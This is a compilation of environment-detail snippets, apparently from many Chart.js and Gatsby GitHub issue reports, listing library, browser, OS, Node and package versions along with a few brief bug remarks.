* chart.js version: 2.7.2
* browser name and version: chrome 67.0.3396.79 (64 bits)
* os : windows 7
* chart.js version: 2.7.*
* browser name and version: linux ubuntu mozilla 60.0.1 (64-bit) i hope the description is clear,
thanks in advance
* chart.js version: 2.7.2
* browser name and version: version 66.0.3359.181 (official build) (64-bit)
* chart.js version: latest (v2.7.2)
* browser name and version: safari v11.0
* link to your project:
* chart.js version: 2.7.1
* browser name and version: chrome * link to your project: - own
* chart.js version: 2.7.2
* browser name and version: chrome 66
* link to your project:
* chart.js version: 2.7.2
* browser name and version:
* link to your project:
* chart.js version: 2.7.2
* browser name and version: chrome v65 # update
turned out that this was also caused by the time points in the datasets not being ordered the same in every dataset, as mentioned in #5405
* chart.js version: v2.7.2
* link to your project:
![image](
* chart.js version: 2.7.2
* browser name and version: opera 51, firefox latest
* chart.js version: 2.6
* browser name and version: nodejs 9
* chart.js version: 2.7.2 (i have tested and reproduced the issue with older versions down to 2.2.2).
* browser name and version: chrome 65.0.3325.181 (also tested in chromium 65.0.3325.181 and opera 51.0.2830.55, firefox 59.0.1 doesn't seem to have this issue).
* os: manjaro linux
* chart.js version: 2.6.0 and 2.7.2 (in an ionic project, but this shouldn't be relevant here)
* browser name and version: chrome 75
chart.js version: latest (2.7.2)
rails version : 4.2.10
ruby version : 2.3.3
browser name and version: latest chrome (65), latest firefox (59)
* chart.js version: 2.7.1
* browser name and version: chrome / opera
* link to your project: n/a
* chart.js version: 2.7.2
* browser name and version: chrome
* chart.js version: 2.7.2
* os: windows 10
* chart.js version: 2.7.2(latest)
* browser name and version: latest chrome, generally
* chart.js version: 2.7.2
* browser name and version: chrome version 64.0.3282.186 (official build) (64-bit)
* chart.js version: 2.7.1
* browser name and version: n/a
* chart.js version: latest
* browser name and version: chrome 64
* link to your project: #
* chart.js version: 2.7.1
* browser name and version: google chrome 63 macos
* link to your project:
* chart.js version: 2.7.1, 2.6.0, 2.5.0, maybe others?
* browser name and version: any
* link to your project:
* chart.js version:
* browser name and version: all
need to make account to access
* chart.js version: 2.7.1
* browser name and version: chrome version 66.0.3334.0
* chart.js version:2.7
* browser name and version: chrome
* link to your project:
* chart.js version: latest .
* browser name and version: chrome 63.0.3239.132
* link to your project: above.
* chart.js version: version: 2.7.1
* browser name and version: firefox quantum, version 57.0.4 (64-bit)
* chart.js version: 2.4.0-2.7.0
* browser name and version: chrome 63 and all others
* chart.js version: 2.7.1
* browser name and version: chrome 63.0.3239.132 64bit
* link to your project:
![untitled-1](
* chart.js version: 2.7.1
* browser name and version: chrome 63.0.3239.84 (64 bit) with window 7
* link to your project:
* chart.js version: 2.7.1
* browser name and version: firefox (version 57.0 (64-bit)) & chrome (version 62.0.3202.94 (official build) (64-bit))
* link to your project: [working codepen](
chartjs 2.6.0/2.7.0/2.7.1
chrome 60.0.3112.78 64bit and ie 11.0.9600.18738
windows 7 64bit
* chart.js version: 2.6.0
* browser name and version: 62.0.3202.94
* angular wrapper: ng2-charts 1.6.0
chrome / windows
* chart.js version: latest aka 2.7.1
* browser name and version: chrome, safari...
* link to your project:
* chart.js version: ^2.7.1
* vue-chart : 2.8.7
* chart.js version: 2.7.1
* any browser
- chrome (61)
- firefox (56)
- edge (40) --- **edge renders the chart despite a high pixel width, and also provides crisp chart lines! however, the chart is still getting cut off at a certain point.**
* chart.js version: 2.6.0 & 2.7.1
* browser name and version: chrome ^58
* chart.js version: 2.7.0
* browser name and version: all browsers
* link to your project:
* chart.js version: latest
* browser name and version: all browsers firefox:
![screen shot 2017-09-28 at 4 20 02 pm]( chrome/safari:
![screen shot 2017-09-28 at 4 13 26 pm](
* chart.js version: 2.7.0
note: this wasn't an issue in version 2.6.0 - we encountered it when trying to upgrade to 2.7.0 to take advantage of some new features in 2.7.
* chart.js version: 2.7
* browser name and version: chrome 61.0.3163.100
* link to your project: again, the project code is not going to stay the same
* chart.js 2.7:
* browser name and version:
* link to your project:
mozilla ff 54.01 64 bit
chart.js 2.6.0
* chart.js version:2.7
* browser name and version: chrome version 60 adn safari 11
* link to your project:
* chart.js 2.7.0:
* chart.js version: 2.7.0
* browser name and version: chrome 60.0.3112 i am not sure whether is it problem with chart.js or just rollup config.
* chart.js version: 2.6.0
* browser name and version: chrome
* link to your project: n/a, see codepen link above for details
* chart.js version: latest master branch
* browser name and version: ionic running on ios
* link to your project:
* chart.js version: latest from npm
* browser name and version: chrome
* link to your project: private
* chart.js version: 2.6.0
* browser name and version: safari 10.1.2
* chart.js version: version 2.6.0
* browser name and version: firefox 53.0.3 (64-bit) (linux mint)
* chart.js version: 2.6.0
* browser name and version: chrome 60.0.3112.101, firefox 54.0.1, safari 10.1.2
* chart.js version: 2.6.0
* browser name and version: chrome 60
* link to your project:
angular-cli, with the lastest available chartjs version
* chart.js 2.6.0:
[project sample codepen.io](
current master
chart.js version: the latest master
browser name and version: chrome 60.0.3112.101, firefox 54.0.1, safari 10.1.2
* chart.js version: 2.6.0
* browser name and version: firefox 54.0.1
* chart.js version: 2.6
* browser name and version: safari 10.1
* chart.js - observed in 2.6.0 and 2.13
* internet explorer 11
*
* chart.js version: 2.6.0
* browser name and version: chrome 59
* chart.js version: 2.6.0
* chart.js version: 2.6.0
* browser name and version: vivaldi chrome and firefox
* chart.js version: 2.6.0
* browser name and version: google chrome 59, microsoft edge 14
* chart.js version: 2.6.0
* browser name and version: safari 10.1.2
* chart.js version: 2.6.0
* browser name and version: chrome 59.0.3071.86 (official build) (64-bit) on ubuntu 17.04
* link to your project: nothing online as yet.
* chart.js version: 2.6.0 (on npm)
* browser name and version: google chrome version 59.0.3071.115 (official build) (64-bit)
* chart.js version: 2.6
* browser name and version: firefox 54
* chart.js after v2.6.0
* firefox 54.0 (64-bit) on fedora 24
* chart.js version: 2.6.0
* browser name and version: chromium version 58.0.3029.96
* chart.js version: 2.6
* browser name and version: chrome version 59.0.3071.115 (official build) (64-bit)
chart.js version: 2.6.0
browser name and version: chrome 59.0.3071.109, firefox 54.0, safari 10.1.1
* chart.js 2.6.0
* firefox 54.0 (64-bit) on fedora 24
* [project]( * clicking the light graph will bring up the modal dialogs with the larger chart that initially had the problem
this issue is not currently visible, since other adjustments got the body of the graph tall enough to fit the y-axis label
i tagged this a a bug, but could be considered a limitation instead
i found nothing similar searching through the open or closed issues.
* chart.js version: 2.6.0
* browser name and version: chrome 59.0.3071.109, firefox 54.0, safari 10.1.1
* chart.js version: 2.6
* chart.js version: 2.6.0
* browser name and version: chrome version 58.0.3029.110 (64-bit)
* reactjs v15.3.2
* bootstrap v3.3.7
* **chart.js version:** 2.6.0 latest (
* **browser name and version:** test on both latest chrome and firefox on my macos
* **link to your project:**
* chart.js version: 2.6.0
* browser name and version: chrome 58
* link to your project: not available
chart.js 2.6.0 firefox/chrome
* chart.js version: 2.6.0
* chart.js version: 2.5.0
* browser name and version: irrelevant, happens in multiple browsers.
* link to your project: not available for sharing.
* chart.js version: latest?
* browser name and version: - firefox 53.0.3 - chromium 58.0.3029.110
* link to your project:
* chart.js version: 2.5.0
* browser name and version: chrome version 56.0.2924.76 (64-bit) running on linux mint 18
* link to your project: [
* chart.js version:
* browser name and version:
* link to your project:
* chart.js version: 2.6.0
* browser name and version: chrome 58.0.3029.81
ie 12 (windows 7)
ie for mobile windows phone 8.1
chart.js version: 2.6.0
* chart.js version: 2.6.0
* browser name and version: chrome (latest)
* polymer version 1.9.1
* chart.js version: 2.6.0
* browser name and version: tried in the latest chrome and safari
* link to your project: n/a
* chart.js version: newest
* browser name and version: chrome, newest
* link to your project:
- chart.js version: 2.6.0
- browser name and version: chrome 58.0.3029.110 (64-bit)
- operating system: macos sierra 10.12.5
* chart.js version: 2.4.0
* browser name and version: google chrome, version 58.0.3029.110 (64-bit), macos
* chart.js version: 2.6.0
* browser name and version: chrome 58.0.3029.110 (64-bit)
* operating system: macos sierra 10.12.5
* chart.js version: tried in 2.0/2.5/2.6
* browser name and version: chrome osx version 58.0.3029.110 (64-bit)
* chart.js version: 2.5
* browser name and version: chrome 58.0.3029.110 (64-bit)
* link to your project:
* chart.js version: 2.5.0
* browser name and version: chrome 58
* link to your project:
* chart.js version: 2.5.0
* browser name and version: chrome 57.0.2987.133 cheers
* chart.js version:
* google chrome 58.0.3029.96 (64-bit)
* chart.js version: 2.5.0
* browser name and version: chrome 57.0.2987.133
* link to your project:
* chart.js version: 2.5
* browser name and version: chrome 55, ie 10
* link to your project:
* chart.js version: 2.5 bundle
* browser name and version: ff 52.0.2
* chart.js version:
* browser name and version:
* link to your project:
i'm trying to use time on the x axis and category on the y in a line graph
it simply doesn't render any points, which i find odd
no console errors are output
i've tried using both the scattered data point method as well as using xlabels and ylabels.
using chart.js v 2.5
here's a fiddle that describes what i'm trying to do:
* chart.js version: 2.5.0
* browser name and version: chrome latest
* link to your project: commercial
* chart.js version: 2.5
* browser name and version: ios safari and chrome
* link to your project: n/a
was using in an ionic 2 project, but happens anywhere (as at the referenced pen i am running in chrome)
* os: reproduced in arch linux 4.10.2-1-arch x86_64 and windows 7 64 bit
* chart.js version: 2.4.0+ (tested with 2.4.0 and 2.5.0)
* jquery version: 2.2.4
* browser name and version: reproduced in firefox 52.0 (64 bit) and chromium 57.0.2987.133 (64-bit).
* chart.js version: v2.4.0+
* browser name and version: firefox, chrome (latest)
* link to your project:
* chart.js version: 2.5.0
* browser name and version: all browsers
* chart.js version: 2.5.0
* browser name and version: all browsers
* chart.js version: 2.5.0
* browser name and version: chrome 56.0.2924.87, ie 11, firefox
* chart.js version: latest 2.5.0
* browser name and version: chrome
* link to your project:
* chart.js version: <= 2.5.0 * browser name and version: firefox 51.0.1 (64-bit) (ubuntu, windows) do you have any hint why it works in chrome and not in firefox? maybe did i do a bad implementation of "getelementatevent" function? i took it from the documentation
* chart.js version: 2.5.0 - same error with 2.2
* browser name and version: 57.0.2987.98 (official build) (64-bit)
* link to your project: github.com/lfox91/ytanalytics
* chart.js version: 2.5.0
* browser name and version: chrome 56
* chart.js version: 2.5
* chart.js version: 2.1.0
* browser name and version: chrome 31.0.1650
* chart.js version: 2.4.0
* browser name and version: chrome 56.0.2924.87
* chart.js version >= 2.4.0:
* chart.js version: 2.5.0
* browser name and version: chrome 56.0.2924.87
* link to your project:
* angular-chart version: 1.1.1
* chart.js version: 2.5.0
* browser name/version: firefox esr 45.8.0 / internet explorer 11.0.9600.18499 / chrome 56.0.2924.87
* chart.js version: 2.4 / 2.5 (maybe any)
* browser name and version: mozilla firefox 51 / ie11 / edge
* chart.js version: v2.4 and v2.5
* browser name and version: chrome latest
* link to your project:
* chart.js version: 2.5.0
* moment.js version: 2.17.1
* browser name and version: chrome 56.0, also tested on firefox 51.0
* chart.js version: 2.5.0
* browser name and version: google chrome version 56.0.2924.87
* chart.js version: 2.4.0
* chart.js version: 2.4.0
* browser name and version: chrome 56
* chart.js version: 2.5.0
* browser name and version: any, not browser related.
* chart.js version: 2.5.0
* browser name and version: google chrome version 56.0.2924.87 (64-bit)
* chart.js version: 2.5.0
* browser name and version: google chrome version 56.0.2924.87 (64-bit)
* link to your project:
* chart.js version:
* browser name and version:
* relevant links: 1
[#2584 in sourcecode]( #l524-l528)
* chart.js version: v2.5.0
* browser name and version: chromium 56
* chart.js version: 2.3.0
* browser name and version: chrome, 56.0.2924.87 * link to your project:
* chart.js version: 2.4.0
* browser name and version: chrome version 55.0.2883.95 (64-bit)
* link to your project: ## extra this seems to work on bar and line charts
i will investigate this and see if it affects other chart types.
* chart.js version: 2.4.0
* browser name and version: chrome 55.0.2883.95 (64-bit)
* chart.js version: latest
* browser name and version: chrome 55 / ubuntu 14.04 / xfce 4.12 (works on firefox)
* chart.js version: 2.4.0
* browser name and version: chrome latest
* link to your project:
* chart.js version: latest
* browser name and version: tested in ie11,chrome,ff
* link to your project: na
* chart.js version: 2.4.0
* chart.js version: 2.4.0 (latest)
* browser name and version: any
* chart.js version: ^2.4.0
* browser name and version: n/a
* link to your project: n/a
* chart.js version: 2.4.0
* moment.js version: 2.17.1
* browser name and version: chrome (latest)
* link to example:
* chart.js version:2.4.0
* browser name and version: chrome version 55.0, firefox 50.1.0
* link to your project:
* chart.js version: 2.3.0.
* chart.js version:2.4.0
* browser name and version:chrome 54.0.2840.98 (64-bit)
* link to your project:
* chart.js version: 2.4.0
* browser name and version: chromium 55
* link to your project:
* chart.js version: `2.4.0`
* browser name and version: any
* link to your projects: ### bar chart (stacked)
this demo shows a big difference in the way the chart is rendered when the scale unit differs
### bar chart
this demo is fork of the stacked bar chart, with hopes to further isolate the root cause
it contains a single dataset, and does not stack any bar data.
* chart.js version: 2.4.0
* browser name and version: any
* chart.js version: 2.4
* browser name and version: chrome 55
* link to your project:
* chart.js version: 2.4
* browser name and version: node.js 6.x
* chart.js version: 2.3.0 & 2.0.0 (used in fiddle)
* browser name and version: chrome latest, ie 11, ff latest
### edit: also present in the latest master ## workaround
as a workaround i have had to truncate my labels so that they are at a more uniformed length, using the ticks callback
then use the tooltip callbacks to present the user with the full length tooltip.
* chart.js version: 2.4.0
* chart.js version: 2.4.0
it depends on the size of my screen :
![graph](
![biggraph](
* chart.js version: 2.4.0
* browser name and version: all
* link to your project:
* chart.js version: 2.4.0
* browser name and version: google chrome 54.0.2840.98 * link to your project: * related to issue #3589 (discovered when trying to resolve this)
chart.js version 2.4.0
* chart.js version: 2.x (2.4.0 in the test linked above)
* browser: chrome
chart.js version : 2.4.0
browser name and version : microsoft edge 38.14393.0.0
link to my project :
chart.js version : 2.4.0
browser name and version : microsoft edge 38.14393.0.0
link to my project : added issues #3506 duplicate of #3491 and #2870
* chart.js version: 2.2.1 vs
* browser name and version: chrome version 54.0.2840.87 (64-bit)
* chart.js version:2.3.0
* chart.js version: 2.4.0 (latest master)
* browser name and version: chrome 54
* link to your project: [jsbin](
* chart.js version: 2.4.0
* browser name and version: ie11
* chart.js version: 2.3.0
* angular chart.js 1.0.3
* browser name and version: chrome version 54.0.2840.71 (64-bit)
- chart.js version: 2.3.0
- browser name and version: chrome 54
- chart.js version: pulled it down about a week ago.
- browser name and version: chrome 54
- chart.js version: 2.2.2
## notes if this is accepted as a bug, i can submit a pr with a fix
- chart.js version: tested with 2.3.0
- browser name and version: all browsers
- link to your project: -
``` system: os: macos 10.15.7 cpu: (12) x64 intel(r) core(tm) i7-9750h cpu @ 2.60ghz shell: 5.7.1 - /bin/zsh binaries: node: 14.14.0 - /usr/local/bin/node yarn: 1.21.0 - /usr/local/bin/yarn npm: 6.14.8 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 86.0.4240.111 safari: 14.0 npmpackages: gatsby: ^2.24.63 => 2.24.91 gatsby-image: ^2.4.19 => 2.4.21 gatsby-plugin-manifest: ^2.4.30 => 2.4.37 gatsby-plugin-offline: ^3.2.28 => 3.2.38 gatsby-plugin-react-helmet: ^3.3.11 => 3.3.14 gatsby-plugin-sharp: ^2.6.36 => 2.6.43 gatsby-source-filesystem: ^2.3.30 => 2.3.37 gatsby-transformer-sharp: ^2.5.15 => 2.5.20 npmglobalpackages: gatsby: 2.24.91
``` system: os: windows 10 10.0.19041 cpu: (8) x64 intel(r) core(tm) i7-7700hq cpu @ 2.80ghz binaries: node: 10.15.1 - c:\\program files\ odejs\ ode.exe yarn: 1.21.1 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 6.14.8 - c:\\program files\ odejs\ pm.cmd languages: python: 3.7.4 - /c/users/able family life/appdata/local/programs/python/python37-32/python browsers: edge: 44.19041.423.0 npmpackages: gatsby: ^2.23.12 => 2.24.90 gatsby-cli: ^2.12.60 => 2.12.113 gatsby-plugin-google-tagmanager: ^2.3.15 => 2.3.16 gatsby-plugin-html-attributes: ^1.0.5 => 1.0.5 gatsby-plugin-no-javascript: ^2.0.5 => 2.0.5 gatsby-plugin-no-javascript-utils: ^0.5.0 => 0.5.0 gatsby-plugin-purgecss: ^5.0.0 => 5.0.0 gatsby-plugin-react-helmet: ^3.3.9 => 3.3.14 gatsby-plugin-sass: ^2.3.7 => 2.3.21 gatsby-plugin-sharp: ^2.6.14 => 2.6.43 gatsby-plugin-split-css: ^1.0.2 => 1.0.2 gatsby-react-router-scroll: ^3.0.3 => 3.0.15 gatsby-source-filesystem: ^2.3.14 => 2.3.37 gatsby-source-graphql: ^2.6.1 => 2.7.6 gatsby-transformer-json: ^2.4.12 => 2.4.15 gatsby-transformer-remark: ^2.8.35 => 2.8.46
``` system: os: macos 10.15.7 cpu: (12) x64 intel(r) core(tm) i9-8950hk cpu @ 2.90ghz shell: 5.7.1 - /bin/zsh binaries: node: 10.23.0 - ~/.nvm/versions/node/v10.23.0/bin/node yarn: 1.22.10 - /usr/local/bin/yarn npm: 6.14.8 - ~/.nvm/versions/node/v10.23.0/bin/npm languages: python: 3.7.3 - /usr/local/anaconda3/bin/python browsers: chrome: 86.0.4240.111 firefox: 81.0.1 safari: 14.0 npmpackages: gatsby: ^2.24.85 => 2.24.85 gatsby-image: ^2.4.21 => 2.4.21 gatsby-plugin-sharp: ^2.6.43 => 2.6.43 gatsby-source-filesystem: ^2.3.37 => 2.3.37 gatsby-transformer-sharp: ^2.5.20 => 2.5.20 npmglobalpackages: gatsby-cli: 2.12.113
(i've also tested this on node v15.0.1) _originally posted by @jakubjafra in
``` system: os: macos 10.15.7 cpu: (16) x64 intel(r) core(tm) i9-9880h cpu @ 2.30ghz shell: 5.7.1 - /bin/zsh binaries: node: 14.7.0 - ~/.nvm/versions/node/v14.7.0/bin/node yarn: 1.22.5 - /usr/local/bin/yarn npm: 6.14.7 - ~/.nvm/versions/node/v14.7.0/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 86.0.4240.111 firefox: 81.0.2 safari: 14.0 npmpackages: gatsby: 2.24.86 => 2.24.86 gatsby-i18n: ^1.1.8 => 1.1.8 gatsby-image: ^2.4.21 => 2.4.21 gatsby-plugin-alias-imports: ^1.0.5 => 1.0.5 gatsby-plugin-google-tagmanager: ^2.3.16 => 2.3.16 gatsby-plugin-manifest: ^2.4.36 => 2.4.36 gatsby-plugin-polyfill-io: ^1.1.0 => 1.1.0 gatsby-plugin-react-helmet: ^3.3.14 => 3.3.14 gatsby-plugin-react-svg: ^3.0.0 => 3.0.0 gatsby-plugin-remove-trailing-slashes: ^2.3.13 => 2.3.13 gatsby-plugin-sass: ^2.3.21 => 2.3.21 gatsby-plugin-sharp: ^2.6.43 => 2.6.43 gatsby-plugin-sitemap: ^2.4.17 => 2.4.17 gatsby-source-contentful: ^3.0.5 => 3.0.5 gatsby-transformer-sharp: ^2.5.20 => 2.5.20
``` system: os: macos 10.15.3 cpu: (8) x64 intel(r) core(tm) i7-4770hq cpu @ 2.20ghz shell: 5.7.1 - /bin/zsh binaries: node: 10.22.0 - /usr/local/opt/node@10/bin/node yarn: 1.22.10 - /usr/local/bin/yarn npm: 6.14.6 - /usr/local/opt/node@10/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 86.0.4240.111 firefox: 77.0.1 safari: 13.0.5 npmpackages: gatsby: ^2.20.35 => 2.24.87 gatsby-image: ^2.3.5 => 2.4.21 gatsby-plugin-netlify: ^2.2.4 => 2.3.24 gatsby-plugin-netlify-cms: ^4.2.5 => 4.3.17 gatsby-plugin-purgecss: ^5.0.0 => 5.0.0 gatsby-plugin-react-helmet: ^3.2.5 => 3.3.14 gatsby-plugin-sass: ^2.2.4 => 2.3.21 gatsby-plugin-sharp: ^2.5.7 => 2.6.43 gatsby-remark-copy-linked-files: ^2.2.4 => 2.3.19 gatsby-remark-images: ^3.2.6 => 3.3.39 gatsby-remark-relative-images: ^0.3.0 => 0.3.0 gatsby-source-filesystem: ^2.2.5 => 2.3.36 gatsby-transformer-remark: ^2.7.5 => 2.8.46 gatsby-transformer-sharp: ^2.4.7 => 2.5.20 npmglobalpackages: gatsby-cli: 2.12.111
``` system: os: macos 10.15 cpu: (8) x64 intel(r) core(tm) i7-7700hq cpu @ 2.80ghz shell: 3.2.57 - /bin/bash binaries: node: 14.13.0 - /usr/local/bin/node yarn: 1.17.3 - /usr/local/bin/yarn npm: 6.14.8 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 86.0.4240.111 firefox: 76.0.1 safari: 13.0.2 npmpackages: gatsby: ^2.24.89 => 2.24.89 gatsby-alias-imports: ^1.0.6 => 1.0.6 gatsby-image: ^2.4.21 => 2.4.21 gatsby-plugin-manifest: ^2.4.36 => 2.4.36 gatsby-plugin-offline: ^3.2.37 => 3.2.37 gatsby-plugin-react-helmet: ^3.3.14 => 3.3.14 gatsby-plugin-sass: ^2.3.21 => 2.3.21 gatsby-plugin-sharp: ^2.6.43 => 2.6.43 gatsby-plugin-svgr-svgo: ^1.0.12 => 1.0.12 gatsby-source-filesystem: ^2.3.37 => 2.3.37 gatsby-transformer-sharp: ^2.5.20 => 2.5.20 npmglobalpackages: gatsby-cli: 2.8.23
``` system: os: windows 10 10.0.19041 cpu: (12) x64 intel(r) core(tm) i7-9750h cpu @ 2.60ghz binaries: node: 12.19.0 - c:\\program files\ odejs\ ode.exe yarn: 1.22.10 - ~\\appdata\ oaming\ pm\\yarn.cmd npm: 6.14.8 - c:\\program files\ odejs\ pm.cmd languages: python: 3.9.0 - /c/python39/python browsers: chrome: 86.0.4240.111 edge: spartan (44.19041.1.0), chromium (86.0.622.51) npmpackages: gatsby: ^2.24.86 => 2.24.86 gatsby-image: ^2.4.21 => 2.4.21 gatsby-plugin-manifest: ^2.4.35 => 2.4.35 gatsby-plugin-offline: ^3.2.37 => 3.2.37 gatsby-plugin-react-helmet: ^3.3.14 => 3.3.14 gatsby-plugin-react-svg: ^3.0.0 => 3.0.0 gatsby-plugin-sharp: ^2.6.43 => 2.6.43 gatsby-plugin-sitemap: ^2.4.17 => 2.4.17 gatsby-plugin-styled-components: ^3.3.14 => 3.3.14 gatsby-source-filesystem: ^2.3.36 => 2.3.36 gatsby-source-strapi: 0.0.12 => 0.0.12 gatsby-transformer-sharp: ^2.5.20 => 2.5.20 npmglobalpackages: gatsby-cli: 2.12.113
system: os: macos 10.15.7 cpu: (12) x64 intel(r) core(tm) i7-8850h cpu @ 2.60ghz shell: 5.7.1 - /bin/zsh binaries: node: 14.13.0 - /usr/local/bin/node npm: 6.14.8 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 86.0.4240.111 safari: 14.0 npmpackages: gatsby: ^2.22.11 => 2.24.80 npmglobalpackages: gatsby-cli: 2.12.113 gatsby-starter-base: 0.4.4
system: os: macos 10.15.7 cpu: (12) x64 intel(r) core(tm) i7-9750h cpu @ 2.60ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.18.3 - ~/.nvm/versions/node/v12.18.3/bin/node yarn: 1.22.5 - /usr/local/bin/yarn npm: 6.14.8 - ~/.nvm/versions/node/v12.18.3/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 86.0.4240.111 firefox: 82.0 safari: 14.0 npmpackages: gatsby: ^2.24.47 => 2.24.85 gatsby-cli: ^2.12.111 => 2.12.111 gatsby-image: ^2.4.16 => 2.4.21 gatsby-plugin-google-analytics: ^2.3.19 => 2.3.19 gatsby-plugin-manifest: ^2.4.23 => 2.4.35 gatsby-plugin-offline: ^3.2.23 => 3.2.37 gatsby-plugin-react-helmet: ^3.3.10 => 3.3.14 gatsby-plugin-scroll-reveal: ^0.0.7 => 0.0.7 gatsby-plugin-sharp: ^2.6.27 => 2.6.43 gatsby-plugin-styled-components: ^3.3.10 => 3.3.14 gatsby-plugin-web-font-loader: ^1.0.4 => 1.0.4 gatsby-source-filesystem: ^2.3.24 => 2.3.35 gatsby-transformer-sharp: ^2.5.13 => 2.5.19
``` system: os: linux 4.19 ubuntu 18.04.4 lts (bionic beaver) cpu: (6) x64 intel(r) core(tm) i5-9600k cpu @ 3.70ghz shell: 4.4.20 - /bin/bash binaries: node: 12.19.0 - ~/.nvm/versions/node/v12.19.0/bin/node yarn: 1.22.10 - ~/.nvm/versions/node/v12.19.0/bin/yarn npm: 6.14.8 - ~/.nvm/versions/node/v12.19.0/bin/npm languages: python: 2.7.17 - /usr/bin/python npmpackages: gatsby: 2.24.85 => 2.24.85 gatsby-image: 2.4.21 => 2.4.21 gatsby-plugin-manifest: 2.4.35 => 2.4.35 gatsby-plugin-offline: 3.2.37 => 3.2.37 gatsby-plugin-react-helmet: 3.3.14 => 3.3.14 gatsby-plugin-react-svg: 3.0.0 => 3.0.0 gatsby-plugin-sharp: 2.6.43 => 2.6.43 gatsby-source-filesystem: 2.3.35 => 2.3.35 gatsby-source-graphql: 2.7.6 => 2.7.6 gatsby-transformer-sharp: 2.5.19 => 2.5.19
windows 10 gatsby cli version: 2.12.111
gatsby version: 2.24.80
% ./node_modules/.bin/gatsby info --clipboard (git)-[master] system: os: macos 10.15.7 cpu: (56) x64 intel(r) xeon(r) w-3275m cpu @ 2.50ghz shell: 5.7.1 - /bin/zsh binaries: node: 14.14.0 - /usr/local/bin/node yarn: 1.22.10 - /usr/local/bin/yarn npm: 6.14.8 - /usr/local/bin/npm languages: python: 3.8.3 - /usr/local/caskroom/miniconda/base/bin/python browsers: chrome: 86.0.4240.111 firefox: 80.0.1 safari: 14.0 npmpackages: gatsby: ^2.24.85 => 2.24.85 gatsby-image: ^2.4.21 => 2.4.21 gatsby-plugin-linaria: ^2.1.0 => 2.1.0 gatsby-plugin-manifest: ^2.4.35 => 2.4.35 gatsby-plugin-offline: ^3.2.37 => 3.2.37 gatsby-plugin-react-helmet: ^3.3.14 => 3.3.14 gatsby-plugin-sharp: ^2.6.43 => 2.6.43 gatsby-source-filesystem: ^2.3.35 => 2.3.35 gatsby-transformer-sharp: ^2.5.19 => 2.5.19
system: os: macos 10.15.7 cpu: (12) x64 intel(r) core(tm) i7-9750h cpu @ 2.60ghz shell: 3.2.57 - /bin/bash binaries: node: 14.13.0 - /usr/local/bin/node npm: 6.14.8 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 86.0.4240.111 edge: 86.0.622.51 firefox: 81.0.2 safari: 14.0 npmpackages: gatsby: ^2.24.85 => 2.24.85 gatsby-plugin-canonical-urls: ^2.3.10 => 2.3.13 gatsby-plugin-google-tagmanager: ^2.3.11 => 2.3.16 gatsby-plugin-react-helmet: ^3.3.10 => 3.3.14 gatsby-plugin-remove-trailing-slashes: ^2.3.11 => 2.3.13 gatsby-plugin-robots-txt: ^1.5.1 => 1.5.3 gatsby-plugin-s3: ^0.3.5 => 0.3.8 gatsby-plugin-sitemap: ^2.4.12 => 2.4.17 gatsby-plugin-verify-bing: ^1.1.18 => 1.1.20 gatsby-remark-external-links: 0.0.4 => 0.0.4 gatsby-source-filesystem: ^2.3.27 => 2.3.35 gatsby-source-graphql: ^2.7.2 => 2.7.6 gatsby-transformer-json: ^2.4.11 => 2.4.15 gatsby-transformer-remark: ^2.8.32 => 2.8.46 npmglobalpackages: gatsby-cli: 2.12.111 gatsby: 2.19.41
``` system: os: windows server 2016 10.0.14393 cpu: (8) x64 intel(r) core(tm) i5-8250u cpu @ 1.60ghz binaries: node: 14.4.0 - c:\\program files\ odejs\ ode.exe npm: 6.14.8 - c:\\program files\ odejs\ pm.cmd languages: python: 3.9.0 browsers: {} npmpackages: gatsby: ^2.24.85 => 2.24.85 npmglobalpackages: gatsby-cli: 2.12.109
system: os: macos 10.15.7 cpu: (8) x64 intel(r) core(tm) i7-8559u cpu @ 2.70ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.19.0 - ~/.nvm/versions/node/v12.19.0/bin/node yarn: 1.22.5 - /usr/local/bin/yarn npm: 6.14.8 - ~/.nvm/versions/node/v12.19.0/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 86.0.4240.111 edge: 86.0.622.48 firefox: 81.0.1 safari: 14.0
{ name: \'gatsby-starter-default\', description: \'gatsby default starter\', \'dist-tags\': { next: \'1.0.0\', latest: \'1.0.0\' }, versions: [ \'1.0.0\' ], maintainers: [ { name: \'davekrstin\', email: \'dave@davekrstin.com\' } ], time: { modified: \'2017-11-16t18:32:55.888z\', created: \'2017-11-16t18:32:55.888z\', \'1.0.0\': \'2017-11-16t18:32:55.888z\' }, keywords: [ \'gatsby\' ], author: { name: \'alecell\', email: \'alecell.dev@gmail.com\' }, license: \'mit\', readmefilename: \'readme.md\', version: \'1.0.0\', dependencies: { gatsby: \'^1.9.99\', \'gatsby-link\': \'^1.6.24\', \'gatsby-plugin-react-helmet\': \'^1.0.8\' }, main: \'n/a\', scripts: { build: \'gatsby build\', develop: \'gatsby develop\', start: \'concurrently "gatsby develop" "json-server --watch ../playground/src/components/statefulshell/configs/remote-config.json"\', format: \'prettier --trailing-comma es5 --no-semi --single-quote --write "src/**/*.js"\', test: \'echo "error: no test specified" && exit 1\' }, devdependencies: { concurrently: \'^3.5.0\', prettier: \'^1.7.4\' }, dist: { integrity: \'sha512-nn5dnz5dbwcde2tmtqb1jroloe9hb8lhgovlq5lu6ugapsn3mqmwht7cacrxd+yd2v+pk0otu9w6ul66olnsmg==\', shasum: \'7d4a555f5a824bcfc876554b82ea839e190d2295\', tarball: \' }, directories: {}
system: os: linux 5.4 ubuntu 20.04.1 lts (focal fossa) cpu: (6) x64 intel(r) core(tm) i5-9600k cpu @ 3.70ghz shell: 5.0.17 - /bin/bash binaries: node: 10.19.0 - /usr/bin/node npm: 6.14.8 - /usr/local/bin/npm browsers: chrome: 85.0.4183.102 firefox: 81.0.2 npmpackages: gatsby: ^2.24.79 => 2.24.79 npmglobalpackages: gatsby-cli: 2.12.111
